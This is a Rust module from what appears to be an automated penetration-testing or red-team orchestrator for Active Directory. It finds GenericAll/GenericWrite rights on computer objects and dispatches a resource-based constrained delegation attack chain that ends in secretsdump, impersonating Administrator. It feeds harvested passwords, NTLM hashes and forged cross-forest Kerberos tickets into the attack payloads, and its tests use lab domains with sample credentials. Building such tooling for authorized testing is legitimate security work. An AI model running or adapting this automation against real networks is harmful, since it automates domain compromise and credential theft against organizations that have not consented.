//! auto_rbcd_exploitation -- exploit GenericAll/GenericWrite on computer objects via RBCD.
//!
//! When a controlled user has GenericAll or GenericWrite on a computer object
//! (e.g., user → DC$), this automation dispatches the full RBCD
//! chain: addcomputer → rbcd_write → S4U → secretsdump.
//!
//! This is separate from s4u.rs which handles pre-existing delegation vulns.
//! RBCD vulns are typically discovered via BloodHound edges.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::dedup::is_ghost_machine_account;
use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::StateInner;

/// Dedup key prefix for RBCD attacks.
const DEDUP_RBCD: &str = "rbcd_exploit";

/// Monitors for GenericAll/GenericWrite on computer objects and dispatches RBCD.
/// Interval: 30s.
pub async fn auto_rbcd_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("rbcd") {
            continue;
        }

        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<RbcdWork> = {
            let state = dispatcher.state.read().await;
            select_rbcd_work(&state)
        };

        for item in work {
            let payload = build_rbcd_payload(&item);

            let priority = dispatcher.effective_priority("rbcd");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        target = %item.target_computer,
                        via_group = ?item.via_group,
                        kerberos = item.kerberos_ccache.is_some(),
                        "RBCD exploitation dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_RBCD, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_RBCD, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch RBCD exploit")
                }
            }
        }
    }
}

pub(crate) struct RbcdWork {
    pub vuln_id: String,
    pub dedup_key: String,
    pub source_user: String,
    pub target_computer: String,
    pub target_ip: Option<String>,
    pub domain: String,
    pub dc_ip: Option<String>,
    pub credential: Option<ares_core::models::Credential>,
    pub hash: Option<ares_core::models::Hash>,
    /// Set when `source_user` was a group name and the credential was
    /// resolved through `foreign_group_membership` expansion. Surfaced in
    /// the payload so logs make the indirection legible.
    pub via_group: Option<String>,
    /// Absolute path to an inter-realm `.ccache` already forged for this
    /// (member-realm → target-realm) pair, if any. Set when the resolved
    /// credential's domain differs from the target domain — cross-forest
    /// RBCD requires Kerberos auth because SID filtering blocks the
    /// NTLM/PAC-via-trust path. Threaded into the payload as
    /// `kerberos_ccache` for the downstream tool wrapper.
    pub kerberos_ccache: Option<String>,
}

/// Select RBCD exploitation work items for this tick.
///
/// Walks `state.discovered_vulnerabilities` keeping only RBCD-candidate
/// (computer-target) entries that are exploitable and have a source-user
/// credential or NTLM hash. Skips ghost-machine-account targets (typically
/// LDAP-only objects with no resolvable IP/SPN — RBCD dispatch against
/// them is a guaranteed failure).
///
/// Extracted from `auto_rbcd_exploitation` so the candidate filter, ghost
/// check, source-cred lookup, and target-IP resolution can be unit-tested
/// without a Dispatcher.
pub(crate) fn select_rbcd_work(state: &StateInner) -> Vec<RbcdWork> {
    state
        .discovered_vulnerabilities
        .values()
        .filter_map(|vuln| {
            let target_type = vuln.details.get("target_type").and_then(|v| v.as_str());
            if !is_rbcd_candidate(&vuln.vuln_type, target_type) {
                return None;
            }
            if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                return None;
            }
            let dedup_key = format!("{DEDUP_RBCD}:{}", vuln.vuln_id);
            if state.is_processed(DEDUP_RBCD, &dedup_key) {
                return None;
            }

            let source_user = vuln
                .details
                .get("source")
                .or_else(|| vuln.details.get("source_user"))
                .or_else(|| vuln.details.get("attacker"))
                .or_else(|| vuln.details.get("account_name"))
                .and_then(|v| v.as_str())
                .map(|s| s.to_string())?;

            let target_computer = vuln
                .details
                .get("target")
                .or_else(|| vuln.details.get("target_computer"))
                .or_else(|| vuln.details.get("victim"))
                .and_then(|v| v.as_str())
                .map(|s| s.to_string())?;
            if is_ghost_machine_account(&target_computer)
                || state.is_self_created_machine_account(&target_computer)
            {
                return None;
            }

            let domain = vuln
                .details
                .get("domain")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            let (credential, hash, via_group) =
                match state.resolve_principal_to_credential(&source_user, &domain) {
                    Some((c, g)) => (Some(c), None, g),
                    None => match state.resolve_principal_to_hash(&source_user, &domain) {
                        Some((h, g)) => (None, Some(h), g),
                        None => return None,
                    },
                };

            let dc_ip = state
                .domain_controllers
                .get(&domain.to_lowercase())
                .cloned();
            let target_ip = resolve_computer_ip(
                &target_computer,
                state
                    .hosts
                    .iter()
                    .map(|h| (h.hostname.as_str(), h.ip.as_str())),
            );

            // Cross-realm: when the resolved credential lives in a different
            // domain than the RBCD target, the LDAP write needs Kerberos
            // auth — a pre-forged inter-realm ccache produced by
            // `create_inter_realm_ticket`. ADCS uses the same pattern; see
            // `automation/adcs.rs:262` for the parallel lookup.
            let cred_domain_l = credential
                .as_ref()
                .map(|c| c.domain.to_lowercase())
                .or_else(|| hash.as_ref().map(|h| h.domain.to_lowercase()))
                .unwrap_or_default();
            let target_l = domain.to_lowercase();
            let kerberos_ccache = if !cred_domain_l.is_empty() && cred_domain_l != target_l {
                state
                    .kerberos_tickets
                    .iter()
                    .find(|t| {
                        t.source_domain.to_lowercase() == cred_domain_l
                            && t.target_domain.to_lowercase() == target_l
                    })
                    .map(|t| t.ticket_path.clone())
            } else {
                None
            };

            Some(RbcdWork {
                vuln_id: vuln.vuln_id.clone(),
                dedup_key,
                source_user,
                target_computer,
                target_ip,
                domain,
                dc_ip,
                credential,
                hash,
                via_group,
                kerberos_ccache,
            })
        })
        .collect()
}

/// Build the JSON payload for an RBCD dispatch. Pure JSON construction.
pub(crate) fn build_rbcd_payload(item: &RbcdWork) -> serde_json::Value {
    let mut payload = json!({
        "technique": "rbcd_attack",
        "vuln_type": "rbcd",
        "vuln_id": item.vuln_id,
        "target_computer": item.target_computer,
        "domain": item.domain,
        "impersonate": "Administrator",
    });
    if let Some(ref dc) = item.dc_ip {
        payload["dc_ip"] = json!(dc);
    }
    if let Some(ref tip) = item.target_ip {
        payload["target_ip"] = json!(tip);
    }
    if let Some(ref cred) = item.credential {
        payload["username"] = json!(cred.username);
        payload["password"] = json!(cred.password);
        payload["credential"] = json!({
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        });
    } else if let Some(ref hash) = item.hash {
        payload["username"] = json!(hash.username);
        payload["hash"] = json!(hash.hash_value);
    }
    if let Some(ref ccache) = item.kerberos_ccache {
        payload["kerberos_ccache"] = json!(ccache);
    }
    if let Some(ref grp) = item.via_group {
        payload["via_group"] = json!(grp);
    }
    payload
}

/// Returns `true` if a vulnerability type and optional target_type represent an
/// RBCD attack candidate (computer object with GenericAll/GenericWrite).
pub(crate) fn is_rbcd_candidate(vuln_type: &str, target_type: Option<&str>) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "rbcd"
        || vtype == "genericall_computer"
        || vtype == "genericwrite_computer"
        || (matches!(vtype.as_str(), "genericall" | "genericwrite")
            && target_type
                .is_some_and(|t| t.to_lowercase() == "computer" || t.to_lowercase().ends_with('$')))
}

/// Resolve a target computer hostname to an IP from a list of known hosts.
/// Strips trailing `$` from machine account names before matching.
pub(crate) fn resolve_computer_ip<'a>(
    target_computer: &str,
    hosts: impl Iterator<Item = (&'a str, &'a str)>,
) -> Option<String> {
    let tc = target_computer
        .to_lowercase()
        .trim_end_matches('$')
        .to_string();
    for (hostname, ip) in hosts {
        let h_lower = hostname.to_lowercase();
        if h_lower == tc || h_lower.starts_with(&format!("{tc}.")) {
            return Some(ip.to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_rbcd_candidate_direct_types() {
        assert!(is_rbcd_candidate("rbcd", None));
        assert!(is_rbcd_candidate("RBCD", None));
        assert!(is_rbcd_candidate("genericall_computer", None));
        assert!(is_rbcd_candidate("GenericWrite_Computer", None));
    }

    #[test]
    fn is_rbcd_candidate_with_target_type() {
        assert!(is_rbcd_candidate("genericall", Some("Computer")));
        assert!(is_rbcd_candidate("genericwrite", Some("DC01$")));
        assert!(is_rbcd_candidate("GenericAll", Some("computer")));
    }

    #[test]
    fn is_rbcd_candidate_negative() {
        assert!(!is_rbcd_candidate("genericall", None));
        assert!(!is_rbcd_candidate("genericall", Some("User")));
        assert!(!is_rbcd_candidate("genericwrite", Some("Group")));
        assert!(!is_rbcd_candidate("esc1", None));
        assert!(!is_rbcd_candidate("shadow_credentials", Some("Computer")));
    }

    #[test]
    fn ghost_machine_target_detected() {
        assert!(is_ghost_machine_account("WIN-DPPJMLU3XS6$"));
    }

    #[test]
    fn resolve_computer_ip_exact_match() {
        let hosts = vec![
            ("dc01", "192.168.58.10"),
            ("sql01.contoso.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("DC01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn resolve_computer_ip_fqdn_match() {
        let hosts = vec![
            ("dc01.contoso.local", "192.168.58.10"),
            ("sql01.contoso.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn resolve_computer_ip_no_match() {
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("dc02$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn resolve_computer_ip_no_dollar_suffix() {
        let hosts = vec![("web01.contoso.local", "192.168.58.30")];
        let result = resolve_computer_ip("web01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.30".to_string()));
    }

    #[test]
    fn resolve_computer_ip_partial_no_match() {
        // "dc01" should not match "dc011.contoso.local"
        let hosts = vec![("dc011.contoso.local", "192.168.58.11")];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn dedup_key_format() {
        let vuln_id = "vuln-123";
        let dedup_key = format!("{DEDUP_RBCD}:{vuln_id}");
        assert_eq!(dedup_key, "rbcd_exploit:vuln-123");
    }

    #[test]
    fn dedup_key_constant() {
        assert_eq!(DEDUP_RBCD, "rbcd_exploit");
    }

    #[test]
    fn dedup_key_with_uuid_vuln_id() {
        let vuln_id = "550e8400-e29b-41d4-a716-446655440000";
        let dedup_key = format!("{DEDUP_RBCD}:{vuln_id}");
        assert_eq!(
            dedup_key,
            "rbcd_exploit:550e8400-e29b-41d4-a716-446655440000"
        );
    }

    #[test]
    fn resolve_computer_ip_empty_hostname() {
        // Hosts with empty hostname should not match anything
        let hosts = vec![("", "192.168.58.10")];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn resolve_computer_ip_empty_target() {
        // Empty target should not match any host
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn resolve_computer_ip_dollar_only_target() {
        // A target of just "$" should trim to empty and not match
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn resolve_computer_ip_case_insensitive() {
        let hosts = vec![("DC01.CONTOSO.LOCAL", "192.168.58.10")];
        let result = resolve_computer_ip("dc01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn resolve_computer_ip_multiple_hosts_first_match() {
        // When multiple hosts could match, returns the first one
        let hosts = vec![
            ("dc01.contoso.local", "192.168.58.10"),
            ("dc01.fabrikam.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("dc01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn resolve_computer_ip_empty_hosts_list() {
        let hosts: Vec<(&str, &str)> = vec![];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn resolve_computer_ip_machine_account_with_dollar() {
        // Verify $ is stripped from machine account names
        let hosts = vec![("sql01.contoso.local", "192.168.58.20")];
        let result = resolve_computer_ip("SQL01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.20".to_string()));
    }

    #[test]
    fn resolve_computer_ip_fqdn_target_no_match() {
        // FQDN target should not match since we only compare short name
        // "dc01.contoso.local" trimmed of $ is "dc01.contoso.local"
        // which does not equal "dc01" and "dc01" does not start with "dc01.contoso.local."
        let hosts = vec![("dc01", "192.168.58.10")];
        let result = resolve_computer_ip("dc01.contoso.local$", hosts.into_iter());
        // tc = "dc01.contoso.local", host "dc01" != "dc01.contoso.local"
        // and "dc01" does not start with "dc01.contoso.local."
        assert!(result.is_none());
    }

    #[test]
    fn is_rbcd_candidate_all_vuln_type_strings() {
        // Exhaustive test of all recognized RBCD vuln_type values
        assert!(is_rbcd_candidate("rbcd", None));
        assert!(is_rbcd_candidate("RBCD", None));
        assert!(is_rbcd_candidate("Rbcd", None));
        assert!(is_rbcd_candidate("genericall_computer", None));
        assert!(is_rbcd_candidate("GenericAll_Computer", None));
        assert!(is_rbcd_candidate("GENERICALL_COMPUTER", None));
        assert!(is_rbcd_candidate("genericwrite_computer", None));
        assert!(is_rbcd_candidate("GenericWrite_Computer", None));
        assert!(is_rbcd_candidate("GENERICWRITE_COMPUTER", None));
    }

    #[test]
    fn is_rbcd_candidate_generic_with_computer_target() {
        // genericall/genericwrite require target_type=Computer to be RBCD candidates
        assert!(is_rbcd_candidate("genericall", Some("Computer")));
        assert!(is_rbcd_candidate("genericall", Some("computer")));
        assert!(is_rbcd_candidate("genericall", Some("COMPUTER")));
        assert!(is_rbcd_candidate("genericwrite", Some("Computer")));
        assert!(is_rbcd_candidate("genericwrite", Some("computer")));
    }

    #[test]
    fn is_rbcd_candidate_generic_with_machine_account_target() {
        // Machine accounts ending with $ are treated as computer targets
        assert!(is_rbcd_candidate("genericall", Some("DC01$")));
        assert!(is_rbcd_candidate("genericwrite", Some("SQL01$")));
        assert!(is_rbcd_candidate("genericall", Some("web01$")));
    }

    #[test]
    fn is_rbcd_candidate_generic_without_target_type_rejected() {
        // genericall/genericwrite without target_type should NOT be RBCD
        assert!(!is_rbcd_candidate("genericall", None));
        assert!(!is_rbcd_candidate("genericwrite", None));
    }

    #[test]
    fn is_rbcd_candidate_generic_with_non_computer_target() {
        // genericall/genericwrite on non-computer targets
        assert!(!is_rbcd_candidate("genericall", Some("User")));
        assert!(!is_rbcd_candidate("genericall", Some("Group")));
        assert!(!is_rbcd_candidate("genericwrite", Some("OU")));
        assert!(!is_rbcd_candidate("genericwrite", Some("GPO")));
        assert!(!is_rbcd_candidate("genericall", Some("")));
    }

    #[test]
    fn is_rbcd_candidate_unrelated_vuln_types() {
        // Non-RBCD vuln types should all return false regardless of target_type
        let non_rbcd = vec![
            "esc1",
            "esc4",
            "esc8",
            "shadow_credentials",
            "constrained_delegation",
            "unconstrained_delegation",
            "gpo_abuse",
            "gpo_write",
            "dcsync",
            "mssql_impersonation",
            "writedacl",
            "writeowner",
            "",
        ];
        for vtype in non_rbcd {
            assert!(
                !is_rbcd_candidate(vtype, None),
                "{vtype:?} should not be RBCD candidate with no target"
            );
            assert!(
                !is_rbcd_candidate(vtype, Some("Computer")),
                "{vtype:?} should not be RBCD candidate even with Computer target"
            );
        }
    }

    // ── tests for select_rbcd_work / build_rbcd_payload ────────────────

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_rbcd_vuln(
        vuln_id: &str,
        source: &str,
        target: &str,
        domain: &str,
        target_type: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("source".into(), serde_json::json!(source));
        details.insert("target".into(), serde_json::json!(target));
        details.insert("target_type".into(), serde_json::json!(target_type));
        details.insert("domain".into(), serde_json::json!(domain));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.to_string(),
            vuln_type: "rbcd".to_string(),
            target: target.to_string(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    #[test]
    fn select_rbcd_emits_when_cred_and_target_present() {
        let mut s = StateInner::new("op".into());
        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        let work = select_rbcd_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].source_user, "alice");
        assert_eq!(work[0].target_computer, "SQL01$");
        assert_eq!(work[0].domain, "contoso.local");
    }

    #[test]
    fn select_rbcd_skips_non_rbcd_vuln() {
        let mut s = StateInner::new("op".into());
        let mut v = make_rbcd_vuln("v1", "alice", "host01", "contoso.local", "User");
        v.vuln_type = "constrained_delegation".into();
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        assert!(select_rbcd_work(&s).is_empty());
    }

    #[test]
    fn select_rbcd_skips_already_exploited() {
        let mut s = StateInner::new("op".into());
        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.exploited_vulnerabilities.insert("v1".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        assert!(select_rbcd_work(&s).is_empty());
    }

    #[test]
    fn select_rbcd_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.mark_processed(DEDUP_RBCD, format!("{DEDUP_RBCD}:v1"));
        assert!(select_rbcd_work(&s).is_empty());
    }

    #[test]
    fn select_rbcd_skips_when_no_credential_or_hash() {
        let mut s = StateInner::new("op".into());
        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        // No credential for alice → skip.
        assert!(select_rbcd_work(&s).is_empty());
    }

    #[test]
    fn select_rbcd_skips_ghost_machine_account_target() {
        let mut s = StateInner::new("op".into());
        // is_ghost_machine_account recognises auto-generated Windows
        // hostnames (WIN- + 11 alphanumerics) that NoPAC creates — not
        // real lab hosts, so RBCD against them is wasted.
        let v = make_rbcd_vuln(
            "v1",
            "alice",
            "WIN-G9FWV8ZNSCL$",
            "contoso.local",
            "Computer",
        );
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        assert!(select_rbcd_work(&s).is_empty());
    }

    // ── build_rbcd_payload ──────────────────────────────────────────────

    fn baseline_rbcd_work() -> RbcdWork {
        RbcdWork {
            vuln_id: "v1".into(),
            dedup_key: "rbcd_exploit:v1".into(),
            source_user: "alice".into(),
            target_computer: "SQL01$".into(),
            target_ip: Some("192.168.58.20".into()),
            domain: "contoso.local".into(),
            dc_ip: Some("192.168.58.10".into()),
            credential: Some(make_cred("alice", "Pw", "contoso.local")),
            hash: None,
            via_group: None,
            kerberos_ccache: None,
        }
    }

    #[test]
    fn build_rbcd_payload_core_fields() {
        let p = build_rbcd_payload(&baseline_rbcd_work());
        assert_eq!(p["technique"], "rbcd_attack");
        assert_eq!(p["vuln_type"], "rbcd");
        assert_eq!(p["vuln_id"], "v1");
        assert_eq!(p["target_computer"], "SQL01$");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["impersonate"], "Administrator");
        assert_eq!(p["dc_ip"], "192.168.58.10");
        assert_eq!(p["target_ip"], "192.168.58.20");
        assert_eq!(p["username"], "alice");
        assert_eq!(p["password"], "Pw");
        assert_eq!(p["credential"]["username"], "alice");
    }

    #[test]
    fn build_rbcd_payload_uses_hash_when_no_credential() {
        let mut w = baseline_rbcd_work();
        w.credential = None;
        w.hash = Some(ares_core::models::Hash {
            id: "h-alice".into(),
            username: "alice".into(),
            hash_value: "deadbeef".into(),
            hash_type: "NTLM".into(),
            domain: "contoso.local".into(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        });
        let p = build_rbcd_payload(&w);
        assert_eq!(p["hash"], "deadbeef");
        assert_eq!(p["username"], "alice");
        assert!(p.get("password").is_none());
        assert!(p.get("credential").is_none());
    }

    #[test]
    fn build_rbcd_payload_omits_optional_fields_when_unset() {
        let mut w = baseline_rbcd_work();
        w.dc_ip = None;
        w.target_ip = None;
        let p = build_rbcd_payload(&w);
        assert!(p.get("dc_ip").is_none());
        assert!(p.get("target_ip").is_none());
        assert!(p.get("kerberos_ccache").is_none());
        assert!(p.get("via_group").is_none());
    }

    #[test]
    fn build_rbcd_payload_includes_kerberos_ccache_and_via_group() {
        let mut w = baseline_rbcd_work();
        w.via_group = Some("CrossForestAdmins".into());
        w.kerberos_ccache = Some("/tmp/alice@CONTOSO.LOCAL.ccache".into());
        let p = build_rbcd_payload(&w);
        assert_eq!(p["via_group"], "CrossForestAdmins");
        assert_eq!(p["kerberos_ccache"], "/tmp/alice@CONTOSO.LOCAL.ccache");
    }

    // ── cross-realm group-expansion integration ──────────────────────────

    fn rbcd_vuln_with_group_source(
        vuln_id: &str,
        group: &str,
        target_computer: &str,
        target_domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("source".into(), serde_json::json!(group));
        details.insert("target".into(), serde_json::json!(target_computer));
        details.insert("target_type".into(), serde_json::json!("Computer"));
        details.insert("domain".into(), serde_json::json!(target_domain));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.into(),
            vuln_type: "rbcd".into(),
            target: target_computer.into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    fn fsp_vuln(
        vuln_id: &str,
        group: &str,
        group_domain: &str,
        member: &str,
        member_domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("source".into(), serde_json::json!(member));
        details.insert("source_domain".into(), serde_json::json!(member_domain));
        details.insert("target".into(), serde_json::json!(group));
        details.insert("domain".into(), serde_json::json!(group_domain));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.into(),
            vuln_type: "foreign_group_membership".into(),
            target: group.into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    #[test]
    fn select_rbcd_resolves_group_source_via_foreign_member_and_attaches_ccache() {
        // Cross-forest RBCD: RBCD vuln carries a group name as `source`
        // (BloodHound emits ACL edges with group sAMAccountNames). The
        // foreign_group_membership vuln identifies the foreign member who
        // is the actual exploitable principal. The selector must resolve
        // to that member's credential, surface via_group, and pick up the
        // pre-forged inter-realm ccache.
        let mut s = StateInner::new("op".into());
        let rbcd =
            rbcd_vuln_with_group_source("v1", "CrossForestAdmins", "dc01$", "fabrikam.local");
        s.discovered_vulnerabilities
            .insert(rbcd.vuln_id.clone(), rbcd);
        let fsp = fsp_vuln(
            "v2",
            "CrossForestAdmins",
            "fabrikam.local",
            "alice",
            "contoso.local",
        );
        s.discovered_vulnerabilities
            .insert(fsp.vuln_id.clone(), fsp);
        s.credentials
            .push(make_cred("alice", "P@ssw0rd!", "contoso.local"));
        s.kerberos_tickets.push(ares_core::models::KerberosTicket {
            source_domain: "contoso.local".into(),
            target_domain: "fabrikam.local".into(),
            username: "alice".into(),
            ticket_path: "/tmp/alice.ccache".into(),
            forged_at: None,
        });

        let work = select_rbcd_work(&s);
        assert_eq!(work.len(), 1);
        let w = &work[0];
        assert_eq!(w.source_user, "CrossForestAdmins");
        let cred = w.credential.as_ref().expect("must resolve credential");
        assert_eq!(cred.username, "alice");
        assert_eq!(cred.domain, "contoso.local");
        assert_eq!(w.via_group.as_deref(), Some("CrossForestAdmins"));
        assert_eq!(w.kerberos_ccache.as_deref(), Some("/tmp/alice.ccache"));

        let payload = build_rbcd_payload(w);
        assert_eq!(payload["username"], "alice");
        assert_eq!(payload["password"], "P@ssw0rd!");
        assert_eq!(payload["via_group"], "CrossForestAdmins");
        assert_eq!(payload["kerberos_ccache"], "/tmp/alice.ccache");
    }

    #[test]
    fn select_rbcd_same_realm_omits_ccache() {
        // alice@contoso.local has GenericAll on SQL01$@contoso.local — no
        // realm crossing, so no ccache lookup should happen even if a
        // forged ticket is present in state.
        let mut s = StateInner::new("op".into());
        let v = make_rbcd_vuln("v1", "alice", "SQL01$", "contoso.local", "Computer");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.kerberos_tickets.push(ares_core::models::KerberosTicket {
            source_domain: "fabrikam.local".into(),
            target_domain: "contoso.local".into(),
            username: "bob".into(),
            ticket_path: "/tmp/unrelated.ccache".into(),
            forged_at: None,
        });

        let work = select_rbcd_work(&s);
        assert_eq!(work.len(), 1);
        assert!(work[0].via_group.is_none());
        assert!(work[0].kerberos_ccache.is_none());
    }
}
